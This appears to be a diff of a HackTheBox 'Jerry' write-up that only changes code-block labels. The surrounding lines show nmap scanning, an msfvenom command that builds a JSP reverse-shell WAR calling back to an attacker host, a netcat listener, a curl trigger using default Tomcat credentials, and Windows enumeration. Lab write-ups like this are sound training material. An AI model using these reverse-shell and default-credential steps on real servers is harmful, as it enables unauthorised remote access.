@@ -17,7 +17,7 @@ previous two in my view,
 Firing up the box and our attack machine, let's start with a straightforward
 [Nmap](https://nmap.org/) scan:
 
-```shell
+```shell-session
 $ nmap -Pn -A -T4 jerry.htb
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-11 16:11 GMT
 Nmap scan report for jerry.htb (10.129.24.108)
@@ -78,7 +78,7 @@ The next step is to generate the reverse shell application. For this we can use
 `msfvenom`, the part of the [Metasploit](https://www.metasploit.com) framework
 used to generate payloads:
 
-```shell
+```shell-session
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.52 LPORT=1337 -f war > reverse.war
 ```
 
@@ -159,13 +159,13 @@ Next, we open a port on our attack machine using
 [netcat](https://en.wikipedia.org/wiki/Netcat) with `nc -nlvp 1337`. Visiting
 the URL for the `reverse.war` binary triggers the reverse shell:
 
-```shell
+```shell-session
 $ curl http://tomcat:s3cret@jerry.htb:8080/reverse/
 ```
 
 Meanwhile, in our netcat session...
 
-```shell
+```shell-session
 $ nc -nlvp 1337
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::1337
@@ -181,7 +181,7 @@ C:\apache-tomcat-7.0.88>
 From here we can poke around the target system, starting with privileges for our
 user:
 
-```shell
+```shell-session
 C:\apache-tomcat-7.0.88>whoami /all
 whoami /all
 
@@ -247,7 +247,7 @@ already have everything we need to read the flags. Heading over to the
 Administrator's desktop, the canonical place to find Windows flags in HTB, we
 can take a look around:
 
-```shell
+```shell-session
 C:\apache-tomcat-7.0.88>cd ../Users/Administrator/Desktop
 cd ../Users/Administrator/Desktop
 
@@ -269,7 +269,7 @@ At this point I sort of expected to find a single file with the flag for the
 admin user. Not being a Windows regular, it took me an embarrassing amount of
 time to realise that `flags` is in fact a directory...
 
-```shell
+```shell-session
 C:\Users\Administrator\Desktop>cd flags
 cd flags
 
